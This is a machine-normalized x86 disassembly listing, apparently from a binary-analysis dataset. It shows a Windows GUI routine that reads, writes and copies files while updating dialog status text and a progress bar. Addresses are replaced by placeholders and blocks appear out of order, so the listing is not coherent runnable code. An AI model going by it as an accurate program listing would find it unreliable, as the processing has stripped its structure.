call sub_401dd0
mov eax [ ebp - 0x9c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffb
mov eax [ rw-data ]
inc edi
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x2d8
call sub_421150
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0x4 ] 0x9
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_4440b0
mov al [ rw-data ]
test al al
je r-xdata
inc [ ebx + 0xd48 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ ebp - 0xb8 ] esi
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov eax [ ebp - 0xb0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ebx edi
imul ebx ebx 0x70
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp eax edx
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ ecx + esi + 0x40 ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_4440b0
mov [ ebp - 0x54 ] eax
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx ebx
push eax
call sub_444100
cmp ebx esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0xf4 ] ebx
je r-xdata
cmp [ ebp - 0x48 ] 0x4
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
jae r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ rw-data ]
imul esi esi 0x70
cmp [ eax + esi + 0x18 ] 0x10
jb r-xdata
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
mov [ ebp - 0x4 ] 0xa
je r-xdata
cmp [ ebx + 0x8 ] esi
jne r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x28 ] esi
je r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xf0 ]
push edx
push edi
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx ebx
push edx
push 0x0
push 0x1
push eax
call sub_43d820
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
lea eax [ eax + esi + 0x4 ]
mov eax [ eax + esi + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebx + 0xc ] 0x2000000c
mov esi [ ebx + 0x20 ]
mov [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebx + 0x884 ]
cmp eax esi
mov ecx [ ebx + 0x458 ]
mov [ ebp + 0x8 ] ecx
jne r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x9
jae r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi 0x10
cmp eax esi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ edx + esi ]
push ecx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jge r-xdata
push eax
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdd3
push eax
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
xor esi esi
movzx eax [ ebx + 0x32 ]
imul eax [ ebx + 0x28 ]
mov ecx [ ebx + 0x2c ]
cdq
and edx 0x7
add eax edx
mov edi eax
shl ecx 0x1
mov eax 0x55555556
imul ecx
sar edi 0x3
mov eax edx
add edi 0x3
shr eax 0x1f
and edi 0xfffffffc
add edx eax
imul edi edx
sub esi edi
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov esi [ eax + 0x18 ]
add esi ecx
xor esi esi
jmp r-xdata
push eax
call [ LocalLock@IAT ]
mov [ ebx + 0x20 ] eax
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov edx [ ebx + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
cmp [ ebp - 0x64 ] esi
mov eax [ ebp - 0x78 ]
jae r-xdata
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + esi ]
mov ecx [ eax + 0x40 ]
test ecx ecx
mov cl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0x8 ] 0x0
mov al [ rw-data ]
test al al
je r-xdata
mov ebx [ ebp - 0x18 ]
mov ecx ebx
call sub_40b2d0
mov ecx [ ebp - 0x18 ]
mov edi eax
mov eax [ ecx + 0xc ]
add ebx 0x24
mov [ ebp - 0x28 ] eax
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax + 0x1c ]
lea edi [ eax + ecx ]
xor edi edi
jmp r-xdata
test eax eax
jne r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ edi + esi + 0x18 ] 0x10
jb r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ edi + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd3
push ecx
call [ SetDlgItemTextA@IAT ]
cmp [ ebx + 0xc ] 0x20000008
mov [ ebp - 0x98 ] 0x0
jne r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
test cl cl
je r-xdata
test cl cl
mov [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp - 0x80 ]
mov [ ebp - 0x1c ] 0x2
mov ecx [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x0
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xd
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x7b4 ]
call sub_439410
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x54 ]
xor edx edx
mov dl [ rw-data ]
mov [ ebp - 0x4 ] 0xb
push edx
mov edx [ ebp + 0x8 ]
push 0x1
push eax
mov eax [ ebp - 0x28 ]
push ecx
push 0x0
push 0x0
push edi
push esi
push edx
push ebx
push eax
lea ecx [ ebp - 0x7b4 ]
call sub_43ba10
test eax eax
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x44c ]
lea ebx [ eax + 0x45c ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
lea edi [ edi + esi + 0x4 ]
mov edi [ edi + esi + 0x4 ]
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
push eax
push 0x0
call [ LocalAlloc@IAT ]
mov edi eax
push 0x0
lea eax [ ebp - 0x108 ]
push eax
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0xf0 ] 0x20000008
mov [ ebp - 0x94 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
cmp [ edi + 0x28 ] 0x10
mov eax [ rw-data ]
jb r-xdata
mov [ ebp - 0x98 ] 0x1
push eax
call [ LocalFree@IAT ]
jmp r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push sub_447d90
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
push edx
jae r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
mov edx [ ebp - 0x4c ]
test edx edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov [ edi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ edi + 0x20 ] 0x0
push 0x6
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
test eax eax
mov [ ebp - 0x4 ] 0x10
je r-xdata
push edi
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ rw-data ]
imul eax eax 0x70
add eax ecx
cmp [ ebx + 0x28 ] 0x10
jb r-xdata
mov [ ebp - 0x94 ] 0x1
lea ebx [ edi + 0x14 ]
mov ebx [ edi + 0x14 ]
jmp r-xdata
cmp [ eax + 0x18 ] edi
jb r-xdata
lea ecx [ ebp - 0x78 ]
mov edx [ eax + 0x28 ]
push ecx
mov ecx [ eax + 0x2c ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
push edx
jae r-xdata
mov ecx rw-data
push 0x0
push 0x0
push ecx
push 0x0
push eax
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
lea ecx [ ebp - 0x78 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push ebx
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push edx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
mov esi eax
mov [ ebp - 0x28 ] esi
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
inc [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ ecx + edx * 4 + 0x4 ]
sub eax [ ecx + edx * 4 ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea esi [ edx + 0x1 ]
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
lea ecx [ ebp + 0x8 ]
add esi eax
push ecx
push esi
call sub_402850
add esp 0x10
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
lea esi [ ebx + 0x14 ]
mov esi [ ebx + 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x98 ]
mov ecx [ eax + esi + 0x50 ]
push edx
mov edx [ eax + esi + 0x4c ]
mov eax [ ebp - 0x14 ]
push ecx
push edx
push eax
call [ LocalSize@IAT ]
mov ecx [ ebp - 0x14 ]
push eax
push ecx
push ebx
call sub_405e70
add esp 0x18
mov [ ebp + 0x8 ] eax
push 0x0
add eax 0x4
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
push ecx
cmp [ eax + 0x18 ] edi
push 0x0
push 0x0
jb r-xdata
lea ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x84 ]
inc eax
mov [ ebp + 0x8 ] 0x1
mov [ ebp - 0x84 ] eax
jmp r-xdata
push eax
call [ LocalFree@IAT ]
jmp r-xdata
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push ecx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp + 0x8 ]
test eax eax
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xc
je r-xdata
mov [ ecx ] eax
call sub_406750
add esp 0x24
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push eax
mov eax [ ebp - 0x48 ]
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
test ecx ecx
mov [ ebp - 0x4 ] 0xf
je r-xdata
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x58 ] 0xd8ff
jne r-xdata
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
push 0x1
push ecx
push ecx
push ecx
push ecx
push eax
push edi
call [ LocalFree@IAT ]
jmp r-xdata
mov edx [ ebp - 0x94 ]
mov ecx [ eax + 0x50 ]
push edx
mov edx [ eax + 0x4c ]
push ecx
push edx
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call sub_405e70
add esp 0x18
test edi edi
mov [ ebp + 0x8 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push eax
push ecx
call [ LocalSize@IAT ]
mov edx [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov ecx [ eax + esi + 0x2c ]
push ecx
mov ecx [ eax + esi + 0x28 ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push 0x0
push 0x0
push ecx
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
test esi esi
mov [ ebp - 0x4 ] 0xb
je r-xdata
test esi esi
push 0x0
push 0x1
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov edi [ ebp - 0x18 ]
mov esi [ ecx + 0x4 ]
lea eax [ ecx + 0x4 ]
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x58 ] 0xe1ff
jne r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + esi + 0x20 ]
push 0x1
push 0x0
push edx
push 0x0
push eax
push 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov edx [ ebp - 0x4c ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call [ LocalSize@IAT ]
push eax
mov eax [ ebp - 0x4c ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
mov [ ebp + 0x8 ] eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + esi + 0x20 ]
push ecx
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
lea ecx [ ebp - 0x7b4 ]
mov [ ebp - 0x4 ] 0xa
call sub_43a1f0
mov eax [ edi + 0x8 ]
dec eax
mov [ ebp - 0x4 ] 0x9
mov [ edi + 0x8 ] eax
jne r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call sub_4065a0
add esp 0xc
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x0
mov edx [ ecx ]
push eax
call [ edx + 0x18 ]
mov eax [ ebp - 0x58 ]
test ax ax
jbe r-xdata
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp + 0x8 ]
call sub_401020
jmp r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
jmp r-xdata
test esi esi
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
mov eax [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push 0x0
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
movzx eax ax
xor ecx ecx
mov ch al
shr eax 0x8
or ecx eax
sub ecx 0x2
mov esi ecx
push esi
mov [ ebp - 0x28 ] esi
call sub_4b66db
mov ebx eax
add esp 0x4
test ebx ebx
mov [ ebp - 0x54 ] ebx
je r-xdata
mov [ eax ] esi
call sub_406750
add esp 0x24
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push esi
push ebx
call [ edx + 0x18 ]
test esi esi
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov [ eax ] esi
call sub_406690
add esp 0x4
mov [ ebp + 0x8 ] eax
inc [ esi + 0x4 ]
sub_44b755
mov esi [ ebp - 0x28 ]
test esi esi
mov [ ebp - 0x4 ] 0xb
je r-xdata
test esi esi
push 0x0
push 0x1
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
lea ecx [ ebp - 0x7b4 ]
mov [ ebp - 0x4 ] 0xa
call sub_43a1f0
mov eax [ edi + 0x8 ]
dec eax
mov [ ebp - 0x4 ] 0x9
mov [ edi + 0x8 ] eax
jne r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call sub_4065a0
add esp 0xc
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
jmp r-xdata
test esi esi
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
mov eax [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push 0x0
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov [ edi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ edi + 0x20 ] 0x0
mov [ eax ] esi
call sub_406750
add esp 0x24
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ebp - 0x18 ]
test eax eax
mov [ ebp - 0x4 ] 0x6
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test esi esi
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi eax
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov [ eax ] esi
call sub_406690
add esp 0x4
mov [ ebp + 0x8 ] eax
inc [ esi + 0x4 ]
mov edi 0x10
mov eax [ ebp - 0x84 ]
inc eax
mov edi 0x10
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov esi [ ebp - 0x24 ]
mov edx [ esi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
lea eax [ ebp - 0x11c ]
push eax
call [ GetLocalTime@IAT ]
lea ecx [ ebp - 0x100 ]
push ecx
lea edx [ ebp - 0x11c ]
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x64 ] edi
mov esi 0xf
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov ecx [ ebp - 0x40 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp - 0x2c ] edi
jb r-xdata
mov edx [ ebp - 0xfc ]
push eax
mov eax [ ebp - 0x100 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp - 0x50 ]
mov ebx [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x64 ] esi
mov esi [ ebp - 0x60 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov edx [ ebp - 0x78 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push eax
mov eax [ ebp - 0x64 ]
push 0x0
cmp eax edi
mov eax [ ebp - 0x78 ]
push 0x0
jae r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x50 ]
cmp eax esi
mov edi [ SetDlgItemTextA@IAT ]
jge r-xdata
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x78 ]
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov esi eax
mov al [ ebx + 0x8 ]
shl esi 0x5
test al al
mov edx [ ecx + esi + 0x1c ]
mov [ ebp - 0x14 ] edx
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov al [ rw-data ]
test al al
je r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdce
push eax
call edi
mov ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd5
push ecx
call edi
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x50 ]
push edx
inc eax
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0x10
lea edx [ ebp - 0x324 ]
push edx
push 0xdcf
push eax
call edi
mov ecx [ ebp - 0x50 ]
mov edx [ ebx + 0x4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push ecx
push 0x402
push 0xdd1
push edx
call edi
mov eax [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x402
push 0xdd2
push eax
call edi
xor ecx ecx
mov eax 0xf
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x78 ] cl
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x40 ] cl
mov edx [ rw-data ]
push 0xffffffff
push ecx
lea eax [ edx + esi ]
push eax
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x18 ] 0x1
call sub_401dd0
mov al [ rw-data ]
test al al
je r-xdata
mov [ ebp - 0x1c ] 0x1
mov al [ rw-data ]
test al al
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi 0x10
nop
mov esi [ rw-data ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
dec ecx
push ecx
call sub_46fbb0
mov eax [ ebp - 0xd8 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
call sub_406690
jmp r-xdata
inc [ ecx + 0x4 ]
mov [ eax ] ecx
call sub_405fe0
jmp r-xdata
inc [ ecx + 0x4 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi [ rw-data ]
xor ebx ebx
cmp eax edi
mov eax [ ebp - 0x40 ]
mov [ rw-data ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
mov ebx [ rw-data ]
push 0xffffffff
shl eax 0x5
add eax ebx
push 0x0
push eax
lea ecx [ ebp - 0x44 ]
call sub_401dd0
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x4 ]
push 0x0
push edx
push 0x1802
push ecx
call [ PostMessageA@IAT ]
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
cmp [ ebp - 0xd4 ] 0x10
mov eax [ ebp - 0xe8 ]
jae r-xdata
mov esi [ ebp - 0x24 ]
mov edi 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
push eax
call sub_439280
add esp 0x4
